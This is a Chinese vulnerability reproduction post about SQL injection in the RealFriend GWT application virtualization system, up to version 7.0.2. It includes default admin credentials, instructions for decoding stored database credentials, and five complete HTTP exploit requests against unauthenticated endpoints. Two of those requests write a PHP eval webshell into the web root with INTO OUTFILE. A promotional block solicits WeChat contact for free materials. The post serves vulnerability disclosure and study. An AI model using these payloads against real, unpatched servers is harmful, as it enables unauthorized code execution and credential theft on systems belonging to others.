## 漏洞简介

微步在线漏洞团队通过“X漏洞奖励计划”获取到瑞友天翼应用虚拟化系统远程代码执行漏洞情报(0day)，攻击者可以通过该漏洞执行任意代码，导致系统被攻击与控制。瑞友天翼应用虚拟化系统是基于服务器计算架构的应用虚拟化平台，它将用户各种应用软件集中部署到瑞友天翼服务集群，客户端通过WEB即可访问经服务器上授权的应用软件，实现集中应用、远程接入、协同办公等。

漏洞是因为未授权接口在接收参数时没有进行处理校验，存在 SQL 注入漏洞，又因为集成环境中的 mysql 拥有写入文件的权限，所以写入 webshell
最终导致代码执行。

### 影响版本

5.x <= 瑞友天翼应用虚拟化系统（GWT System） <= 7.0.2.

目前相关漏洞已修复。

## 环境搭建

从师傅处拷到的安装包 Gwt7.0.2.1.exe 默认模式安装，最后

​![image](https://image.3001.net/images/20230425/1682412101_644792459f1842f9b3a31.png!small)​

​![image](https://image.3001.net/images/20230425/1682412103_6447924707547e224cdb5.png!small)​

在线注册获取试用 <http://mop.realor.cn/TrialReg.aspx>

​![image](https://image.3001.net/images/20230425/1682412104_64479248363871d4b3432.png!small)注册成功后

​![image](https://image.3001.net/images/20230425/1682412105_6447924984825a0aecefb.png!small)登录页面
默认账号密码是 `Admin/123`​

​![image](https://image.3001.net/images/20230425/1682412106_6447924a9f6c58d6d9bca.png!small)​

默认路径在 `C:/Program Files (x86)/RealFriend/Rap Server/WebRoot`​

​![image](https://image.3001.net/images/20230425/1682412108_6447924c57c87d53fab5a.png!small)

默认数据库配置地址 `C:\Program Files (x86)\RealFriend\Rap
Server\data\Config\CasDbCnn.dat`​

​![image](https://image.3001.net/images/20230425/1682412109_6447924d8aca9aeb81f57.png!small)​

账号密码需要将其中的 # 替换为 = 并进行 base64 解码

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

## 漏洞复现与分析

通过 `<http://192.168.222.148/RAPAgent.XGI?CMD=GetRegInfo>`​ 查看版本信息

​![image](https://image.3001.net/images/20230425/1682412110_6447924ec47d5ac341910.png!small)​

为了方便查看后端实际执行的完整sql，我们可以使用框架提供的 getLastSql() 方法来 获取最近一次执行的SQL语句

​![image](https://image.3001.net/images/20230425/1682412111_6447924fd7149473f4041.png!small)​

### 注入一IndexController.class.phpdologin

​`webroot/casweb/Home/Controller/IndexController.class.php:dologin`​

​![image](https://image.3001.net/images/20230425/1682412113_6447925115eb0bd93fa35.png!small)我们看到其中的
SQL 语句以及对该函数的请求路由

​`<http://www.casweb.cn.x/index.php?s=/Index/dologin/name/admin/pwd/c4ca4238a0b923820dcc509a6f75849b>`​

构造数据包 并打印出相对应的 sql 语句

​![image](https://image.3001.net/images/20230425/1682412114_64479252860a25ccd86e1.png!small)因为默认没有开启验证码，所以可以直接到达
SQL 语句处

因为搭建环境时，使用了集成好的mysql 环境，拥有 DBA 的权限，所以可以在文件夹任意位置写入内容

    
    
    show global variables like '%secure%';

​![image](https://image.3001.net/images/20230425/1682412115_64479253caf288a50c3cf.png!small)​

secure_file_priv='' #允许写入到任何文件夹

利用报错信息得到项目的绝对路径

​![image](https://image.3001.net/images/20230425/1682412116_64479254ea3c82e97e512.png!small)构造payload

    
    
    POST /index.php?s=/Index/dologin/name HTTP/1.1  
    Host: 192.168.222.148  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Encoding: gzip, deflate  
    Accept-Language: zh-CN,zh;q=0.9  
    Connection: close  
    Content-Type: application/x-www-form-urlencoded  
    Content-Length: 221  
    ​  
    name=1')+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31, '<?php eval($_REQUEST["cmd"]);?>' into outfile 'C:/Program Files (x86)/RealFriend/Rap Server/WebRoot/dologin.php'#

​![image](https://image.3001.net/images/20230425/1682412118_64479256ac5f1e9a2f263.png!small)​​![image](https://image.3001.net/images/20230425/1682412120_644792583346892b8da40.png!small)​

​![image](https://image.3001.net/images/20230425/1682412121_6447925954125e6ea1412.png!small)​

### 查询管理员用户的账户和密码

​![image](https://image.3001.net/images/20230425/1682412122_6447925add50a47364c16.png!small)![image](https://image.3001.net/images/20230425/1682412124_6447925c8f2aa746f37ed.png!small)​

### 注入二__ConsoleExternalUploadApi.XGI

​`webroot/ConsoleExternalUploadApi.XGI`​

​![image](https://image.3001.net/images/20230425/1682412126_6447925e6b3ab8e44315c.png!small)获取到三个参数，当三个参数都不为空时，调用
`getfarminfo`​ 来进行处理

​`webroot/Function.XGI`​

​​![image](https://image.3001.net/images/20230425/1682412128_644792602e272d69f2fe9.png!small)​

​`webroot/Common.XGI`​

​![image](https://image.3001.net/images/20230425/1682412129_6447926153792398d521a.png!small)对
key 值没有做任何校验，所以可以构造 payload 实现注入

    
    
    POST /ConsoleExternalUploadApi.XGI HTTP/1.1  
    Host: 192.168.222.148  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Encoding: gzip, deflate  
    Accept-Language: zh-CN,zh;q=0.9  
    Connection: close  
    Content-Length: 46  
    Content-Type: application/x-www-form-urlencoded  
    ​  
    initParams=1&sign=2&key=FarmName'and sleep(5)#

修改了代码 打印出了 SQL 命令

​![image](https://image.3001.net/images/20230425/1682412130_64479262b0e2f6983cd08.png!small)构造实现注入写入文件

    
    
    POST /ConsoleExternalUploadApi.XGI HTTP/1.1  
    Host: 192.168.222.148  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Encoding: gzip, deflate  
    Accept-Language: zh-CN,zh;q=0.9  
    Connection: close  
    Content-Length: 170  
    Content-Type: application/x-www-form-urlencoded  
    ​  
    initParams=1&sign=1&key=1'union select '<?php eval($_REQUEST["cmd"]);?>' into outfile 'C:/Program Files (x86)/RealFriend/Rap Server/WebRoot/ConsoleExternalUploadApi.php'#

​![image](https://image.3001.net/images/20230425/1682412132_6447926452e615adf05c9.png!small)​

​![image](https://image.3001.net/images/20230425/1682412133_64479265957b221999437.png!small)​

​![image](https://image.3001.net/images/20230425/1682412134_64479266a2c2621c2df00.png!small)​

### 注入三ConsoleExternalUploadApi.XGIuploadAuthorizeKeyFile

    
    
    POST /ConsoleExternalUploadApi.XGI HTTP/1.1  
    Host: 192.168.222.148  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Encoding: gzip, deflate  
    Accept-Language: zh-CN,zh;q=0.9  
    Connection: close  
    Content-Type: application/x-www-form-urlencoded  
    Content-Length: 122  
    ​  
    initParams=command_uploadAuthorizeKeyFile__user_admin'and+sleep(5)#__pwd_1&key=inner&sign=d3adb9869bd6a377fa452930d920fd10

​![image](https://image.3001.net/images/20230425/1682412136_6447926801040a5ca70cb.png!small)​

### 注入四ConsoleExternalApi.XGIcreateUser

‍

之后的漏洞大抵上都可以描述为同一个漏洞，只是因为参数的不同，传入到不同的位置，在这里仅仅用一个来举例，之后的不再详细进行分析

我们从 ConsoleExternalApi.XGI 进行分析

​![image](https://image.3001.net/images/20230425/1682412137_6447926965c7546cf1112.png!small)通过
REQUEST 方法获取到参数

​![image](https://image.3001.net/images/20230425/1682412138_6447926adedb532a3dde9.png!small)通过接下来的这段代码，我们可以得到如下结论，当
$key 的值为 `inner`​ 时，$keyVal 是一个固定值，$sign 的值是 `md5($initparams . $keyVal);`​
$initparams 中需要包含 `__`​ 来分割数据，得到每个参数

​![image](https://image.3001.net/images/20230425/1682412140_6447926c6dd70440cd23f.png!small)然后再通过
`_`​ 分割 得到每个参数所对应的值 也就是当传入的值是 a_1__b_2 最后得到的也就是 a=1&b=2

继续向下分析

​![image](https://image.3001.net/images/20230425/1682412142_6447926e1e4324cd41063.png!small)当传入的
cmd 的值是 `createUser`​ 时，进入相对应的分支，构造相对应的语句就可以实现注入。

    
    
    POST /ConsoleExternalApi.XGI?initParams=command_createUser__user_admin__pwd_1&key=inner&sign=bd58378906794858b1f57eb272e5d84f HTTP/1.1  
    Host: 192.168.222.148  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Encoding: gzip, deflate  
    Accept-Language: zh-CN,zh;q=0.9  
    Connection: close  
    Content-Length: 46  
    Content-Type: application/json  
    ​  
    {"account":"1'or sleep(5)#",  
    "userPwd":"1"}

​![image](https://image.3001.net/images/20230425/1682412143_6447926fe804c57119b42.png!small)​

‍

### 注入五 ConsoleExternalApi.XGIgetUserDetailByAccount

    
    
    POST /ConsoleExternalApi.XGI HTTP/1.1  
    Host: 192.168.222.148  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Encoding: gzip, deflate  
    Accept-Language: zh-CN,zh;q=0.9  
    Connection: close  
    Content-Type: application/x-www-form-urlencoded  
    Content-Length: 132  
    ​  
    initParams=command_getUserDetailByAccount__user_admin__account_1' or sleep(5) and '1&key=inner&sign=e24b8206a168347821a2f10aede99058

​![image](https://image.3001.net/images/20230425/1682412145_6447927141795e1654ac7.png!small)

 **更多网安技能的在线实操练习，[请点击这里>>﻿](https://www.hetianlab.com/)**

  

